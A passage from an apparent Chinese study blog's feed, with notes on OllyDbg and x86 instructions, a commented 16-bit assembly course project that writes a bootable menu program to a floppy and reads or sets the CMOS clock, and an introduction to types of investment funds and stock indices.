        <content type="html"><![CDATA[<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="软件使用方面"><a href="#软件使用方面" class="headerlink" title="软件使用方面"></a>软件使用方面</h2><p>这些天主要就是跟着书本上的案例,使用OllyDbg对程序进行逆向分析。</p><p>跟着书上做，总体过程还是比较顺利，但是对于大段的汇编代码，阅读起来实在是费劲。这还是在有注释的情况下进行分析。如果连课本的引导和注释都没有的话，想必难度会成指数增长。如果有机会真的想了解那些做外挂的是怎么弄的。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><h3 id="为什么32位计算机或者64位计算机可以兼容以前16位版本的程序"><a href="#为什么32位计算机或者64位计算机可以兼容以前16位版本的程序" class="headerlink" title="为什么32位计算机或者64位计算机可以兼容以前16位版本的程序"></a>为什么32位计算机或者64位计算机可以兼容以前16位版本的程序</h3><p>从汇编的角度上来看的话,16位、32位、64位 <code>AX BX AL AH</code> 等寄存器的含义都是一样的。唯一不同的地方体现在<code>EAX</code>是32位的。<code>RAX</code>是64位的。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211111210432.png" alt="x64寄存器的命名规则"></p><h3 id="LEA-Load-Effective-Address-指令和MOV指令的区别"><a href="#LEA-Load-Effective-Address-指令和MOV指令的区别" class="headerlink" title="LEA(Load Effective Address )指令和MOV指令的区别"></a>LEA(Load Effective Address )指令和MOV指令的区别</h3><p>参考链接：<a href="https://www.jianshu.com/p/3e89d834df85">https://www.jianshu.com/p/3e89d834df85</a></p><p>LEA 指令要求原操作数必须是存储单元，而且目的操作数必须是一个除段寄存器之外的16位或32位寄存器。当目的操作数是16位通用寄存器时，那么只装入有效地址的低16位。使用时要注意它与MOV指令的区别，MOV指令传送的一般是源操作数中的内容而不是地址。</p><blockquote><p>假设 SI=1000H, DS=5000H, (51000H)=1234H<br>执行指令 <code>LEA BX, [SI]</code> 后 BX=1000H<br>执行指令 <code>MOV BX,[SI]</code> 后 BX=1234H<br><code>LEA BX,XXX</code>可以用 <code>MOV BX,OFFSET XXX</code>来替代</p></blockquote><p><strong>但有些时候,必须要用LEA指令来完成某些功能，不能用MOV指令来实现，必须用LEA指令。</strong></p><p>如 <code>LEA BX,6[DI]</code></p><p>解释: 某数组含20个元素，每个元素占一个字节，序号为0~19。设DI指向数组开头处，如果把序号为6的元素的偏移地址送到BX中。就必须使用LEA指令。因为<strong>OFFSET 运算符只能返回数据标号的偏移量</strong>,然而并不是所有的内存单元都有数据标号。</p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程核心原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-课程设计2</title>
      <link href="/2021/11/04/hui-bian-yu-yan-xue-xi-ke-cheng-she-ji-2/"/>
      <url>/2021/11/04/hui-bian-yu-yan-xue-xi-ke-cheng-she-ji-2/</url>
      
        <content type="html"><![CDATA[<h1 id="课程设计2"><a href="#课程设计2" class="headerlink" title="课程设计2"></a>课程设计2</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>具体的描述就不再打一遍了</p><blockquote><p>该程序的功能如下:</p><ol><li>列出功能选项，让用户通过键盘进行选择,界面如下。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211104103229.png" alt="实现页面"></li></ol></blockquote><blockquote><ol start="2"><li>用户输入1, 重新启动计算机(提示FFFF:0)</li><li>用户输入2, 引导现有的操作系统</li><li>用户输入3, 执行动态显示当前日期、时间的程序。格式: 年/月/日 时:分:秒 F1改变 Esc键后，返回主菜单</li><li>用户输入4, 更改当前的日期、时间。返回主选单。</li></ol></blockquote><h2 id="遇到的问题总结"><a href="#遇到的问题总结" class="headerlink" title="遇到的问题总结"></a>遇到的问题总结</h2><p>这里面其实很多问题本可以避免，但是在看书的时候，并没有注意到这些东西，或者说注意到了，可没有正确的理解。课程设计正如书上面说的它用到了我们所学到的所有技术，对于我们的整个学习过程是具有总结性的。</p><p>这些问题在我写程序的时候，感觉很是问题，很有总结的必要。写完之后，倒是感觉简单了一些。</p><ol><li><p><code>ds:[offset A]</code> 和 <code>offset A</code> 的区别</p><p> 前面<code>ds:[offset A]</code>取的是具体地址里面的值，<code>offset A </code>取得是偏移地址。在你写的时候，一定搞清楚，你到底是想要<code>字符串的首地址</code>还是<code>字符串首地址那个字符</code></p></li><li><p>数据/代码结构的设置问题,设置怎样的数据结构会使程序结构更清晰更明了</p><p>关于程序的逻辑具体就是把每一个菜单的总体逻辑放到一起，实现的细节写成子程序。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211104110930.png" alt="菜单4的主体逻辑"></p></li><li><p>多余代码废话的问题，很多程序写的很多余</p><p>老毛病了，这个东西在以后也得多练。</p></li><li><p>call指令和jmp指令\还有那些条件跳转的指令</p><p>关于这个我有一点问题, 条件转移只有-127-128的范围，如果我想实现按照条件执行不同的函数,那我就得先条件跳转到一个子程序的地方。然后再call,执行完再jmp回来。</p><p>有没有那种可以实现可以根据条件来call的, 但是这样一想的话，好像就多余了。因为依据现有的条件就可以实现，加上的话是不是就多余了呢。</p></li><li><p>寻址问题 ds:[bx+si]用数学的表达到底是什么样的，和你的写的是不是一样</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211104110024.png" alt="data"></p><p>本来是想着把ds弄成7E00,想着就不用在偏移量上面+7E00H了,结果发现自己是真脑残。正常的寻址过程是 <code>段寄存器*16+偏移地址 用数学化的表示是 ax=ds*16+bx</code>憨逼的你居然认为可以通过把ds设置为7E00H达到不用+7E00h的效果—真是太脑残了</p></li><li><p>子程序名称前后不一致</p><p>第一开始并没有直接设计到软盘的操作，就是先实现页面和具体的功能。后面加上软驱的操作的时候，有些子程序的名字不一样了。也没改。就导致效果出不来，还得debug好长时间。</p></li><li><p>环境问题</p><p>关于环境实在是人人都不一样,版本啊啥的，很容易就出现怎么弄，都弄不好的情况，但是总归来说还是不算太难。耐下心来取弄就行了。</p><p>我看有的<a href="https://blog.csdn.net/apollon_krj/article/details/71908442">博主</a>是直接用的winxp,但是我试过之后不行。于是我直接装了一个ms-dos的虚拟机，然后在xp系统中把汇编程序写进软驱中，再把软驱连接到ms-dos系统中，启动ms-dos系统。观察效果。</p><p>在这里还是感谢一下博主，虽然在具体的问题上面还是得自己解决。但是最起码程序是可以运行的，让我看到了具体的效果。</p></li></ol><h2 id="编程上面的提升"><a href="#编程上面的提升" class="headerlink" title="编程上面的提升"></a>编程上面的提升</h2><ol><li><p>根据功能号计算对应子程序在table中的偏移量。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211104145727.png" alt="调用不同的功能"></p></li><li><p>对于不规则的数据调用，可以先把要读取的不规则位置存放下来，用的时候按存放的顺序进行读取。这样就变不规则为规则了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211104150011.png" alt="变不规则为规则"></p></li><li><p>如果觉得一个功能实现起来有些矛盾，可以去看看所有与之有关的程序。也许可以通过改已经实现的功能来解决。</p><p>具体到这里就是:<strong>设计更改颜色，并没有在显示的地方进行设置。这样就避开了改变颜色之后，显示的程序又把颜色给覆盖掉的问题</strong></p></li><li><p>关于debug的时候，有的时候会出现在运行循环之后，cpu那边的代码就给变化了</p><pre><code> 其实造成这种奇奇怪怪原因的无非有以下几种情况： 1.你在loop循环的过程中没有控制好临界条件 2.在loop循环的过程中,最起码在判断cx的值的时候，cx的值发生了改变 3.没有写对要写入的地址---地址搞错了等等 4.累加变化的寄存器的值，累加的不对造成越界或者写错了</code></pre></li></ol><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1.gif" alt="1"></p><h3 id="引导现有的系统"><a href="#引导现有的系统" class="headerlink" title="引导现有的系统"></a>引导现有的系统</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/2.gif" alt="2"></p><h3 id="显示时间改变颜色返回"><a href="#显示时间改变颜色返回" class="headerlink" title="显示时间改变颜色返回"></a>显示时间改变颜色返回</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/2.gif" alt="3"></p><h3 id="设置时间"><a href="#设置时间" class="headerlink" title="设置时间"></a>设置时间</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/4.gif" alt="4"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:code,ds:data,ss:stackdata segment    db 256 dup(0)data endsstack segment    db 128 dup(0)stack endscode segmentstart:    mov ax,data    mov ds,ax        mov ax,stack    mov ss,ax    mov sp,128    mov ax,offset boot_end - offset boot    call lead_to_softdisk;将引导程序写入软盘    call boot_to_softdisk;将系统程序写入软盘    mov ax,4c00h    int 21h;将系统程序从软盘读入内存lead:    ;设置栈    mov bx,0    mov ss,bx    mov sp,7C00H    ;将系统程序从软盘读入内存    mov ax,0    mov es,ax    mov bx,7E00h    ;int13入口参数 ah 2读  3写    ;al 磁盘数| ch磁道号|cl扇区号|dh磁头号|dl驱动器号 0软驱A 80h盘C es：bx指向写入磁盘的数据    mov al,2    mov ch,0    mov cl,2    mov dh,0    mov dl,0    mov ah,2    int 13h    ;转到7E00H处执行    mov ax,0    push ax    mov ax,7E00h    push ax    retfret    lead_to_softdisk:    push cs    pop es    mov bx,offset lead    mov al,1    mov ch,0    mov cl,1    mov dh,0    mov dl,0    mov ah,3    int 13hretboot_to_softdisk:    push cs    pop es    mov bx,offset boot    mov al,2    mov ch,0    mov cl,2    mov dh,0    mov dl,0    mov ah,3    int 13hretboot:    jmp bootstart;*****************************************************************************    MENU0 db 'Welcome to system!',0    MENU1 db '1) reset pc',0      ;重新启动计算机    MENU2 db '2) start system',0  ;引导现有的操作系统    MENU3 db '3) clock',0         ;显示时间    MENU4 db '4) set clock',0     ;设置时间    TIME  db 'YY/MM/DD hh:mm:ss',0;时间显示格式    SETTIMENOTE db 'Reset the time in the following format: YY/MM/DD hh:mm:ss. eg.21/11/2 10:49:50. Press Enter to end!',0;设置时间的提示    SETTIME db '############',0;存放设置的时间    CMOS  db 9,8,7,4,2,0          ;CMOS中日期格式的存放位置    MENU    dw offset MENU0 - offset boot + 7E00h            dw offset MENU1 - offset boot + 7E00h            dw offset MENU2 - offset boot + 7E00h            dw offset MENU3 - offset boot + 7E00h            dw offset MENU4  -offset boot + 7E00h            dw 0            TABLE_FUNTION   dw offset m1-offset boot + 7E00h                    dw offset m2-offset boot + 7E00h                    dw offset m3-offset boot + 7E00h                    dw offset m4-offset boot + 7E00h;*****************************************************************************bootstart:    mov ax,0;本来是想着把ds弄成7E00,想着就不用在偏移量上面+7E00H了,结果发现自己是真脑残    mov ds,ax;正常的寻址过程是 段寄存器*16+偏移地址 用数学化的表示是 ax=ds*16+bx            ;憨逼的你居然认为可以通过把ds设置为7E00H达到不用+7E00h的效果---真是太脑残了    call clearscreen    call showmenu    call keyboardinput        cmp ah,02    jb bootstart    cmp ah,05    ja bootstart        mov bx,0    sub al,31H    mov bl,al    add bx,bx    call word ptr ds:[offset TABLE_FUNTION - offset boot + bx + 7E00h];子程序都存放到表里,按照偏移量来调用    jmp bootstart;保证一直在循环里面;==============================================================;菜单一         重新启动计算机m1:    pushf    mov ax,0FFFFH    push ax    mov ax,0    push axiret;==============================================================;菜单二         引导现有的操作系统m2:    mov bx,0            ;将C盘(驱动80H)的0面0道0扇区复制到0:7C00H处    mov es,bx    mov bx,7C00H    mov al,1    ;1个扇区    mov ah,2    ;读    mov ch,0    ;0磁道    mov cl,1    ;1扇区    mov dh,0    ;0面    mov dl,80H  ;C盘驱动    int 13H     call clearscreen;清屏    mov bx,0            ;从0:7C00开始执行，启动引导操作系统    push bx     mov bx,7C00H    push bx    retfret;==============================================================;菜单三         显示时间m3:     call clearscreen;清屏    m3_all_s:        ;------这个地方还真挺离谱的，我把m3_gettime写到循环里就不行,写成子程序反而行了。。        ;------至于为什么不行，我不清楚？？下午看一下---又莫名其妙的可以了，我真服了        ;------这种思维也挺重要的，菜单只显示菜单的基本逻辑，其他的全部弄到子程中。方便修改。思路也清楚        ;获取时间        call m3_gettime        ;显示时间        mov ax,0B800h        mov es,ax        mov si,10*160 + 30*2        mov bx,0        mov ds,bx                                       ;这种方式只是赋予了  TIME里面的YY        ; mov bx,ds:[offset TIME - offset boot + 7E00h];仔细看看这种方式到底赋给bx的是什么,我知道你想给TIME的地址，但是        mov bx,offset TIME - offset boot + 7E00h;真正应该这样写。真正要的是地址而不是值        call showmenuline        ;获取键盘输入        ;------- call keyboardinput 这里使用这个获取键盘输入的话--也就是获取按键是个阻塞的过程，时间的显示会卡住        in al,60h        cmp al,01;Esc返回主页面        je m3_backtostart        cmp al,3BH;F1返回改变颜色        je F1_m3_changecolor                ;-------该是je的地方不能用call，否则程序执行就乱跳了。汇编中难道就没有那种根据条件来call的指令？        ;-------就非得是je完之后再call，call完之后再跳回来？？    jmp m3_all_s        m3_backtostart:        ret    F1_m3_changecolor:        call m3_changecolor        jmp m3_all_s;名称: m3_changecolor;功能: 改变屏幕的颜色;参数: 无;返回: 无;应用举例: m3_changecolor:    push bx    push es    push cx    mov bx,0B800H    mov es,bx    mov bx,1    mov cx,2000    m3_changecolorloop:        inc byte ptr es:[bx]        add bx,2    loop m3_changecolorloop    pop cx    pop es    pop bxret;名称: m3_gettime;功能: 从CMOS中读取时间，将时间按照格式写入data段中的TIME中;参数: 无;返回: 无;应用举例: 21/11/1 13:30:50m3_gettime:    push si    push cx    push bx    ;往ds:TIME中写入    mov si,0    mov bx,0    mov cx,6    m3_gettime_s:        push cx        mov al,ds:[offset CMOS- offset boot + si + 7E00h]        out 70h,al        in al,71h        mov ah,al        mov cl,4         ;------造成代码在循环之后发生改变的，是这里改变了cx的值        ;------其实造成这种奇奇怪怪原因的无非有以下几种情况：        ;------1.你在loop循环的过程中没有控制好临界条件        ;------2.在loop循环的过程中,最起码在判断cx的值的时候，cx的值发生了改变        ;------3.没有写对要写入的地址---地址搞错了等等        ;------4.累加变化的寄存器的值，累加的不对        shr ah,cl;右移四位，取高四位        and al,00001111b;取低四位                add ah,30h        add al,30h        mov ds:[offset TIME - offset boot + bx + 7E00h],ah        mov ds:[offset TIME - offset boot + bx + 1 + 7E00h],al                add bx,3        add si,1        pop cx    loop m3_gettime_s        pop bx    pop cx    pop siret;==============================================================;菜单四         设置时间---回车结束m4:    push bx    push dx    push cx    ;清屏    call clearscreen    ;显示提示    mov ax,0b800h    mov es,ax    mov si,10*160    mov bx,0    mov ds,bx    mov bx,offset SETTIMENOTE- offset boot + 7E00h    call showmenuline        ;放置光标    mov ah,2    mov bh,0    mov dh,13    mov dl,30    int 10h    ;接受输入,设置CMOS时间    call getstr    call settimetocmos    ; 光说不返回到主菜单呢,你看看哪里有start？！ 早就改成bootstart了    ; ;返回主菜单    ; m4_backtostart:    ;     call start    pop cx    pop dx    pop bxret;==============================================================;将设置好的时间写入CMOS中settimetocmos:    push bx    push cx    push dx    push si    mov si,offset SETTIME- offset boot + 7E00h    mov cx,6    mov bx,0    mov ds,bx    settimetocmos_s:        push cx        mov word ptr dx,[si]        sub dx,3030H        mov cl,4        shl dl,cl        and dh,00001111B        or dl,dh;从两个ACII码---16位转换成BCD码--8位        mov al,ds:[offset CMOS- offset boot + bx + 7E00h]        out 70H,al    ;将al送入地址端口70h        mov al,dl        out 71H,al ;    将数据写入CMOSRAM时钟                add bx,1        add si,2        pop cx    loop settimetocmos_s    pop si    pop dx    pop cx    pop bxret;==============================================================;字符串接收getstr:    push ax    mov si,offset SETTIME - offset boot + 7E00h    getstrs:        mov ah,0        int 16h        cmp al,30h      ; ASCII码小于30h,说明不是数字        jb nonumber        cmp al,39H        ja nonumber     ; ASCII码大于39h,也不是数字        mov ah,0        call charstack  ; 字符入栈        mov ah,2        call charstack  ; 显示栈中的字符        jmp getstrs    nonumber:        cmp ah,0eh      ; 退格键的扫描码        je backspace            cmp ah,1ch      ; Enter键的扫描码        je enter        cmp ah,01h      ; Esc键的扫描码        je getstrs_backtostart        jmp getstrs    backspace:        mov ah,1        call charstack  ; 字符出栈        mov ah,2        call charstack  ; 显示栈中的字符        jmp getstrs    enter:              ; 输入回车之后也直接推出去        pop axret    getstrs_backtostart: ;esc返回主菜单        jmp bootstart;==============================================================;名称: keyboardinput;功能: 使用int中断获取键盘的输入;参数: 无;返回: ah为扫描码   al为ASCII码keyboardinput:    mov ax,0    int 16hret    ;==============================================================;名称: clearscreen;功能: 清除显存中第一页的显示;参数: 无;返回: 无clearscreen:    push bx    push es    push di    push cx    mov bx,0B800H    mov es,bx    mov di,0    mov bx,0700h;全部设置为黑色，填充就是0 设置颜色默认为黑底白字    mov cx,2000    clearscreenloop:            mov es:[di],bx            add di,2    loop clearscreenloop        pop cx    pop di    pop es    pop bxret;==============================================================;名称: showmenu;功能: 展示菜单;参数: 无;返回: 无showmenu:    push si    push bx    push di    push es    push cx    mov bx,0B800H   ;显存的位置    mov es,bx    mov si,10*160 + 30*2    ;mov bx,offset MENU - offset boot + 7E00h;------就得像这样先把MENU转移出来才行。。。。ds:[ds:MENU[bx]+di]这种写法也可以    ;上面这样算出来是标量啊，肯定是显示不了第一句话。你真正要的是ds:[bx]这样才是第一句的地址    ;所以在你把循环改了之后,就可以显示第一句了     mov di,0    mov cx,5    showmenu_s:        mov bx,ds:[offset MENU - offset boot + di + 7E00h];每一个字符串所对应的首地址        call showmenuline        add si,160        add di,2    loop showmenu_s    showmenu_s_ret:        pop cx        pop es        pop di        pop bx        pop siret;名称: showmenuline;功能: 显示字符串;参数: ds:bx指向要显示字符串的首地址,以0结尾;      es:si 写入显存的位置;返回: 无showmenuline:;ds:bx指向要显示的字符串的首地址,以0结尾,si标明位置    push bx    push si    showmenuline_s:        mov al,ds:[bx]        cmp al,0        je showmenuline_s_ret                mov es:[si],al        ; mov byte ptr es:[si+1],07H 在清屏的地方已经设置过了                add si,2        add bx,1    jmp showmenuline_s    showmenuline_s_ret:        pop si        pop bxret;==============================================================;子程序: 字符栈的入栈、出栈和显示;参数说明: ah=功能号 0入栈 1出栈 2显示;         ds:si指向字符栈空间;         对于0号功能:al=入栈字符;         对于1号功能:al=返回字符;         对于2号功能:dh\dl=字符串在屏幕上显示的行、列位置charstack:    jmp short charstart    table dw offset charpush- offset boot + 7e00h,offset charpop - offset boot + 7e00h,offset charshow - offset boot + 7e00h    top dw 0                        ;the top of stack    charstart:        push bx        push cx        push di        push es        push si        mov bx,0        mov ds,bx        cmp ah,2        ja sret        mov bl,ah        mov bh,0        add bx,bx        jmp word ptr ds:[offset table - offset boot + bx + 7E00h]    charpush:        mov cx,ds:[offset top - offset boot + 7E00h]        cmp cx,11        ja sret        mov bx,ds:[offset top - offset boot + 7E00h]        mov ds:[si][bx],al        inc cx        mov ds:[offset top - offset boot + 7E00h],cx         jmp sret    charpop:        mov cx,ds:[offset top - offset boot + 7E00h]        cmp cx,0        je sret        dec cx        mov ds:[offset top - offset boot + 7E00h],cx         mov bx,ds:[offset top - offset boot + 7E00h]        mov al,ds:[si][bx]        mov byte ptr ds:[si][bx],'#'        jmp sret    ;-------这里实在是没办法了,逻辑上都没有问题,用子程序显示就能显示,用书上的程序反而不显示,不知道为什么    charshow:        mov bx,0b800h        mov es,bx        mov si,13*160+30*2        mov bx,offset SETTIME - offset boot + 7E00h        call showmenuline    sret:        pop si        pop es        pop di        pop dx        pop bxret;==============================================================boot_end:nop;================================================================code endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>财经-基金</title>
      <link href="/2021/11/02/cai-jing-ji-jin/"/>
      <url>/2021/11/02/cai-jing-ji-jin/</url>
      
        <content type="html"><![CDATA[<h1 id="基金"><a href="#基金" class="headerlink" title="基金"></a>基金</h1><h2 id="基金的分类"><a href="#基金的分类" class="headerlink" title="基金的分类"></a>基金的分类</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211102211501.png" alt="思维导图"></p><h3 id="投资方向"><a href="#投资方向" class="headerlink" title="投资方向"></a>投资方向</h3><ul><li><strong>货币型基金</strong>: 以短期国债、中央银行票据、银行存款等货币市场工具为投资对象。货币市场基金只能以货币市场工具为投资对象。比如余额宝等。</li></ul><blockquote><p>收益稳定、流动性强、随时存取</p></blockquote><ul><li><strong>债券型基金</strong>: 绝大部分资金都用于投资债券。债券投资比例为总资金的80%以上。</li></ul><blockquote><p>比较安全、收益也比较低</p></blockquote><ul><li><strong>混合型基金</strong>: 这类基金可以投资股票，也可以投资债券，甚至货币，资产的配置相对比较灵活。</li></ul><blockquote><p>风险低于股票型又高于债卷型。混合基金会根据基金投资目标的不同而指定不同的股票和债券配置比例，据此还可以细分：如果股票配置比例较高（50-70）就叫做<strong>偏股型基金</strong>; 如果股票和债券的配置比例差不多，就叫做<strong>股债平衡型基金</strong>；灵活配置；<strong>灵活配置型基金</strong>没有具体的比例，会根据市场状况灵活调整配置。</p></blockquote><ul><li><strong>股票型基金</strong>：绝大部分资金都投资于股票，股票投资站基金资产的80%以上</li></ul><blockquote><p>高风险、高收益</p></blockquote><h3 id="投资理念"><a href="#投资理念" class="headerlink" title="投资理念"></a>投资理念</h3><p>按照投资理念来分类，可以把基金分为主动型和被动型。</p><ul><li><p><strong>主动型基金</strong>以获取超越业绩基准的超额收益为目标，由基金经理主动投资管理，所以受基金经理个人风格影响比较大，属于高收益高风险的基金。比较适合于想在短期波动中寻找超额收益的人。</p></li><li><p><strong>被动性基金</strong>又被称为指数基金，是指被动跟踪某一市场指数，以获取一个市场平均收益为目标。这类基金几乎不受基金经理的操作影响，并且长期来看，指数是不断上涨的，适合于长期定投想在长期趋势中获益的人。同时定投指数基金也是投资大神巴菲特力荐的一种投资方式。</p></li></ul><h3 id="交易渠道"><a href="#交易渠道" class="headerlink" title="交易渠道"></a>交易渠道</h3><ul><li><strong>场内基金</strong> 指证券交易所上市，就是我们平常所说的股票市场，也称为二级市场。目前国内有两家证券交易所：上海证券交易所和深圳证券交易所。</li><li><strong>场外基金</strong> 指股票交易市场以外的市场，场外基金的买卖平台很多，包括银行、证券公司，基金公司和第三方销售公司，但注意不同渠道的申赎手续费不一定相同。在天天基金上买到的基金基本上都属于场外基金。</li></ul><h3 id="募集方式"><a href="#募集方式" class="headerlink" title="募集方式"></a>募集方式</h3><ul><li><p><strong>公募基金</strong> 公开发售的形式，向广大社会公众募集资金。</p></li><li><p><strong>私募基金</strong> 非公开的募集资金，门槛高。最低都是在100万以上。</p></li></ul><h3 id="运作方式"><a href="#运作方式" class="headerlink" title="运作方式"></a>运作方式</h3><ul><li><p><strong>封闭式基金</strong> 指基金份额在基金合同期限内固定不变，即基金募集结束后不再接受投资者的申购或者赎回份额。但是基金份额可以在证券交易所上市交易。这类基金不仅规模固定，连申购赎回时间也是固定的，中间是没办法赎回的，有点像定期存款。</p></li><li><p><strong>开放式基金</strong> 开放式基金份额不固定，在基金合同约定的时间，都可以向基金公司申购或者赎回份额。开放式基金也可以在证券交易所上市交易，比较灵活，规模不固定，随时可以申购和赎回。</p></li></ul><h3 id="特殊类型的基金"><a href="#特殊类型的基金" class="headerlink" title="特殊类型的基金"></a>特殊类型的基金</h3><ul><li><p><strong>ETF基金</strong> ETF，交易型开放式指数基金，又称为交易所交易基金(Exchange Traded Funds),是一种可以在交易所交易，基金份额可变的一种特殊开放式基金，它结合了封闭式基金和开放式基金的运作特点。是一种被动式管理型指数基金，跟踪复制指数。</p></li><li><p><strong>QDII</strong> QDII是Qualified Domestic Institutional Investor (合格的境内机构投资者)的首字缩写。它是在一国境内设立，经该国有关部门批准从事境外证券市场的股票、债券等有价证券业务的证券投资基金。</p></li><li><p><strong>分级基金</strong>分级基金又称结构型基金，是指在一个投资组合下，通过对基金收益或净资产的分解，形成两级(或多级)风险收益表现有一定差异化基金份额的基金品种。</p></li></ul><h2 id="常用的指数含义"><a href="#常用的指数含义" class="headerlink" title="常用的指数含义"></a>常用的指数含义</h2><h3 id="上证指数"><a href="#上证指数" class="headerlink" title="上证指数"></a>上证指数</h3><p>上证指数很好理解，就是在上海证券交易所上市的所有股票(股票代码60开头的)，按照某种计算方法给算出来的。怎么计算出来的我们可以不用管，但我们要知道，市值越大的股票，对指数的影响就越大。</p><h3 id="深圳成指"><a href="#深圳成指" class="headerlink" title="深圳成指"></a>深圳成指</h3><p>深证成指，就是在深圳证券交易所上市的500只股票，计算出来的一个指数。这500只股票是深市中最牛逼的500只，具体的挑选方法不重要。我们需要知道的是，深证成指代表的是深市的股票走势。深证成指的影响力没有上证指数大</p><h3 id="创业板指"><a href="#创业板指" class="headerlink" title="创业板指"></a>创业板指</h3><p>是由所有创业板的股票计算出来的。这个指数的走势，代表的是市场里面中小股票的走势。不过左右的指数基本都是，市值越大，权重就越大，对指数影响越大。</p><h3 id="沪深300、中证500、上证50"><a href="#沪深300、中证500、上证50" class="headerlink" 